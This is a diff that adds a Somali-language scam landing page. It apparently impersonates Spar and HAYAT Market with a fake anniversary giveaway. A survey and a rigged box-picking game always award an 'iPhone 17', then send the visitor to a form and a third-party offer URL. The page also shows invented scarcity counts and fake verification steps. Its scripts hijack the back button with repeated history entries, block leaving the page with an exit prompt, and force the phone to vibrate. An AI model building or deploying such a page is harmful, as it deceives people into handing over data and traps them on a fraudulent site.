@@ -1,0 +1,470 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+  <head>
+    <title>Spr 1 2025</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="lander" content="survey-pick-a-box" />
+    <meta name="description" content="survey-pick-a-box" />
+    <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon" />
+    <link
+      href="https://nyrh.xyz/sparmarketsmo/css/app1.css?id=2fbe2d9a9a40ca9b2489"
+      type="text/css"
+      rel="stylesheet"
+    />
+
+    <meta name="robots" content="noindex,nofollow" />
+  </head>
+  <img src="https://i.ibb.co/ccS0D5P1/prime.jpg" width="100%" />
+  <img src="https://i.ibb.co/S7KPfR2D/main.png" width="99%" />
+
+  <style>
+    .app {
+      align-items: center;
+      box-sizing: border-box;
+      display: flex;
+      justify-content: center;
+      padding: 15px;
+    }
+    .left,
+    .right {
+      align-self: start;
+      margin: 0 20px;
+      max-width: 400px;
+      width: 100%;
+    }
+    .product-preview__title {
+      font-family: Pacifico, sans-serif;
+      font-size: 36px;
+    }
+    .product-preview__image {
+      max-width: 340px;
+      width: 100%;
+    }
+    .survey {
+      background: #eaeaea;
+      font-size: 21px;
+      font-weight: 700;
+      max-width: none;
+      padding: 40px;
+      position: relative;
+      text-align: center;
+    }
+    .survey__question {
+      color: #000000;
+    }
+    .survey__answer {
+      background: #007c33;
+      border: 8px solid #007c33;
+      border-radius: 14px;
+      box-shadow: none;
+      color: #fff;
+      cursor: pointer;
+      display: block;
+      font-size: 30px;
+      font-weight: 700;
+      line-height: 28px;
+      margin-top: 15px;
+      padding: 19px 20px;
+      text-decoration: none;
+      width: 100%;
+    }
+    .survey__steps {
+      margin-top: 20px;
+    }
+    .survey__step {
+      background: #fff;
+      border-radius: 50%;
+      display: inline-block;
+      font-size: 0;
+      height: 30px;
+      margin: 0 5px;
+      width: 30px;
+    }
+    .survey__step--active {
+      background: #007c33;
+    }
+    .modal {
+      color: #000000;
+      z-index: 6;
+    }
+    .modal__content {
+      background-color: #007c33;
+      padding: 20px;
+    }
+    .opening-modal__image {
+      max-width: 190px;
+      width: 100%;
+    }
+    .button {
+      background-color: #007c33;
+      border: none;
+      border-radius: 0.25rem;
+      color: #fff;
+      display: inline-block;
+      font-size: 1.6rem;
+      font-weight: 400;
+      line-height: 1.5;
+      padding: 0.25rem 3.8rem;
+      text-decoration: none;
+      transition:
+        color 0.15s ease-in-out,
+        background-color 0.15s ease-in-out,
+        border-color 0.15s ease-in-out,
+        box-shadow 0.15s ease-in-out;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      vertical-align: middle;
+    }
+    .button,
+    .verify {
+      text-align: center;
+    }
+    .verify {
+      background: #eaeaea;
+      color: #000000;
+      padding: 40px;
+    }
+    .verify__text {
+      padding: 2px 0;
+    }
+    .verify__icon {
+      max-width: 13px;
+    }
+    .verify__icon--spinner {
+      opacity: 0;
+    }
+    .verify__icon--visible {
+      opacity: 1;
+    }
+    .text-rotator {
+      font-size: 21px;
+      margin-bottom: 10px;
+    }
+    @media (max-width: 640px) {
+      .app {
+        flex-direction: column;
+      }
+      .left,
+      .right {
+        margin: 0;
+        max-width: none;
+        width: 100%;
+      }
+      .survey {
+        padding: 20px;
+      }
+      .survey__answer {
+        font-size: 18px;
+        line-height: 20px;
+        padding: 10px;
+      }
+    }
+  </style>
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+
+    * {
+      margin: 0;
+      padding: 0;
+      font-family:
+        Poppins,
+        Droid Arabic Naskh;
+      font-weight: 14px;
+      box-sizing: border-box;
+      text-align: center;
+    }
+    html,
+    body {
+      font-size: 16px;
+      width: 100%;
+      height: 100%;
+      padding: 0;
+      margin: 0;
+
+      -webkit-text-size-adjust: 100%;
+      -webkit-tap-highlight-color: transparent;
+    }
+  </style>
+  <body>
+    <div class="app" id="app" v-cloak>
+      <vue-modal
+        v-show="!showRotator && !showPrize"
+        :open="showOpeningModal"
+        class="opening-modal"
+      >
+        <img
+          class="opening-modal__image"
+          src="https://i.ibb.co/4RwVrD0D/hayat-logo.png"
+          alt="Apple iPhone 13 Pro Max"
+        />
+        <h1 class="heading heading--h1">Hambalyo!</h1>
+        <p class="paragraph">
+          Munaasabadda sannad-guuradii 37aad, waxaad ka mid tahay dadka yar ee
+          loo doortay inay helaan abaalmarinno bilaash ah! by HAYAT Market.
+        </p>
+        <p class="paragraph"></p>
+        <br />
+        <button
+          class="button"
+          v-on:click="showOpeningModal = false; $confetti.stop()"
+        >
+          SII WAD
+        </button>
+      </vue-modal>
+      <vue-modal :open="showInstructionsModal">
+        <img
+          src="https://i.ibb.co/4RwVrD0D/hayat-logo.png"
+          style="width: 100px"
+        />
+        <h2 class="heading heading--h1">Hambalyo !</h2>
+        <h4 class="heading heading--h1">Jawaabahaaga waa la keydiyay</h4>
+        <p class="paragraph">
+          Tani waa fursaddaada!
+          <br /><br />
+          Waa inaad doorataa sanduuqa ay hadiyaddu ku jirto.
+          <br /><br />
+          waxaad heysataa 3 isku day, nasiib wacan!
+        </p>
+        <br />
+        <button class="button" v-on:click="showInstructionsModal = false">
+          Hadda bilow
+        </button>
+      </vue-modal>
+      <vue-modal :open="showFailModal">
+        <img
+          src="https://i.ibb.co/4RwVrD0D/hayat-logo.png"
+          style="width: 100px"
+        />
+        <h1 class="heading heading--h1">Nasiib wacan marka xigta</h1>
+        <p class="paragraph">Waxaad heysataa (2) fursado dheeraad ah.</p>
+        <br />
+        <button class="button" v-on:click="showFailModal = false">HAYE</button>
+      </vue-modal>
+      <vue-modal :open="showSuccessModal">
+        <img src="https://i.ibb.co/Z60BjT8S/iphone.png" style="width: 180px" />
+        <h1 class="heading heading--h1">Hambalyo!</h1>
+        <h3 class="heading heading--h1">Waad samaysay! waad guulaysatay :</h3>
+
+        <p class="paragraph">
+          (Apple iPhone 17 - 256GB)
+          <br />
+          <br />Raac tilmaamaha bogga xiga si aad u hesho abaalmarintaada !
+        </p>
+        <br />
+        <a href="/form.html" class="button">XIGA</a>
+      </vue-modal>
+      <div class="left">
+        <div class="product-preview">
+          <div class="product-preview__title"></div>
+          <h1 class="heading heading--h1">Hambalyo!</h1>
+          <p class="paragraph">
+            Spar Market - Hadiyadaha sannad-guurada 37aad <br />
+            Ka qayb gal hadda oo guulayso abaalmarino badan oo qiimo leh
+          </p>
+          <br />
+        </div>
+      </div>
+      <div class="right">
+        <vue-box-picker
+          v-if="showBoxPicker"
+          :vertical-items="4"
+          lid-image="https://i.imgur.com/ppQh4XE.png"
+          box-image="https://i.imgur.com/l34UCgQ.png"
+          box-back-image="https://i.imgur.com/ve5fhRU.png"
+          prize-image="https://i.imgur.com/KwJJSUf.png"
+          v-on:fail="onBoxPickerFail"
+          v-on:success="onBoxPickerSuccess"
+          :horizontal-items="3"
+          :max-clicks="2"
+        ></vue-box-picker>
+        <div class="verify" v-if="showRotator">
+          <vue-text-rotator
+            v-on:rotate="rotate"
+            v-on:finished="onRotatorFinished"
+            :strings='[
+                     "Fadlan sug ...",
+              "Fadlan sug ...",
+              "Fadlan sug ..."
+            ]'
+          >
+          </vue-text-rotator>
+          <div class="verify__text" v-if="rotateIndex > 1">
+            <strong> Waad ka jawaabtay dhammaan su'aalaha. </strong>
+            <img
+              class="verify__icon verify__icon--checked"
+              src="https://i.imgur.com/CnKHluD.png"
+              alt=""
+            />
+          </div>
+          <div class="verify__text" v-else>
+            Jawaabahaaga waa la baarayaa
+            <img
+              class="verify__icon verify__icon--spinner"
+              :class="{'verify__icon--visible' : rotateIndex > 0}"
+              src="https://i.imgur.com/2U02Ltr.gif"
+              alt=""
+            />
+          </div>
+          <div class="verify__text" v-if="rotateIndex > 2">
+            <strong> Weli waxaa jira abaalmarino la heli karo! </strong>
+            <img
+              class="verify__icon verify__icon--checked"
+              src="https://i.imgur.com/CnKHluD.png"
+              alt=""
+            />
+          </div>
+          <div class="verify__text" v-else>
+            Raadinaya hadiyado..
+            <img
+              class="verify__icon verify__icon--spinner"
+              :class="{'verify__icon--visible' : rotateIndex > 1}"
+              src="https://i.imgur.com/2U02Ltr.gif"
+              alt=""
+            />
+          </div>
+          <div class="verify__text" v-if="rotateIndex > 3">
+            <strong> Kaliya (1344) hadiyado ayaa hartay! </strong>
+            <img
+              class="verify__icon verify__icon--checked"
+              src="https://i.imgur.com/CnKHluD.png"
+              alt=""
+            />
+          </div>
+          <div class="verify__text" v-else>
+            Kaydka waa la baarayaa
+            <img
+              class="verify__icon verify__icon--spinner"
+              :class="{'verify__icon--visible' : rotateIndex > 2 }"
+              src="https://i.imgur.com/2U02Ltr.gif"
+              alt=""
+            />
+          </div>
+        </div>
+        <vue-survey
+          v-if="showSurvey"
+          :show-steps="true"
+          :questions='[
+           {
+              title: "Ma taqaan Spar?",
+              answers: [ { text: "HAA" }, { text: "MAYA" } ]
+            },
+                                                             {
+              title: "Jinsigaagu waa maxay? ",
+              answers: [ { text: "LAB" }, { text: "DHEEDDIG" } ]
+            },
+            {
+              title: "Immisa sano ayaad jirtaa?",
+              answers: [ { text: "18-21" }, { text: "22-29" }, { text: "30-39" }, { text: "40-59" }, { text: "60+" } ]
+            },
+                                                                         {
+              title: "Sideed u qiimeyn lahayd Spar? ",
+              answers: [ { text: "Cajiib" }, { text: "Aad u Wacan" }, { text: "Wacan" }, { text: "Ma Wanaagsana" } ]
+            },
+            {
+              title: "Ma ku talin lahayd saaxiibkaa? ",
+              answers: [ { text: "HAA" }, { text: "MAYA" } ]
+            },
+          ]'
+          v-on:finish="onSurveyFinish"
+        ></vue-survey>
+      </div>
+    </div>
+
+    <script>
+      window.view = window.view || {};
+      view.offerUrl = "https:\/\/rdr.funcontent.xyz/click";
+      view.qs = null;
+      view.skip = 0;
+      view.screenshot = 0;
+      view.download = 1;
+      view.noredir = false;
+    </script>
+    <script
+      src="https://nyrh.xyz/sparmarketsmo/css/app1.js?id=d41d8cd98f00b204e980"
+      type="application/javascript"
+    ></script>
+    <script
+      src="app.js"
+      type="application/javascript"
+    ></script>
+
+    <script>
+      var PreventExitPop = true;
+
+      function ExitPop() {
+        if (PreventExitPop != false) {
+          return "Ha seegin!";
+        }
+      }
+      window.onbeforeunload = ExitPop;
+    </script>
+    <script>
+      !(function () {
+        var t;
+        try {
+          const URL = window.location.href.split(/[#]/)[0];
+          for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + "#");
+          onpopstate = function (event) {
+            event.state && location.replace("#");
+          };
+        } catch (o) {
+          console.log(o);
+        }
+      })();
+    </script>
+
+    <script>
+      navigator.vibrate([1000, 300, 1000, 300, 1000]);
+    </script>
+
+    <img src="https://i.imgur.com/iPeJwyN.jpeg" width="100%" />
+
+    <script
+      src="https://nyrh.xyz/p.js?f=sync&lr=1&partner=6ead5f0c5ddb6c1d33a3179db69d52f2ab5ba8ceb41f0306c27032933ca3b3f3"
+      defer
+    ></script>
+  </body>
+  <script>
+    "undefined" === typeof _trfq || (window._trfq = []);
+    "undefined" === typeof _trfd && (window._trfd = []),
+      _trfd.push(
+        { "tccl.baseHost": "secureserver.net" },
+        { ap: "cpsh-oh" },
+        { server: "p3plzcpnl509564" },
+        { dcenter: "p3" },
+        { cp_id: "10405938" },
+        { cp_cl: "8" }
+      ); // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.
+  </script>
+  <script src="https://img1.wsimg.com/traffic-assets/js/tccl.min.js"></script>
+</html>
+
+<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">
+  var _Hasync = _Hasync || [];
+  _Hasync.push(["Histats.start", "1,3494498,4,0,0,0,00010000"]);
+  _Hasync.push(["Histats.fasi", "1"]);
+  _Hasync.push(["Histats.track_hits", ""]);
+  (function () {
+    var hs = document.createElement("script");
+    hs.type = "text/javascript";
+    hs.async = true;
+    hs.src = "//s10.histats.com/js15_as.js";
+    (
+      document.getElementsByTagName("head")[0] ||
+      document.getElementsByTagName("body")[0]
+    ).appendChild(hs);
+  })();
+</script>
+<noscript
+  ><a href="/" target="_blank"
+    ><img
+      src="//sstatic1.histats.com/0.gif?3494498&101"
+      alt="web counter gratis"
+      border="0" /></a
+></noscript>
+<!-- Histats.com  END  -->
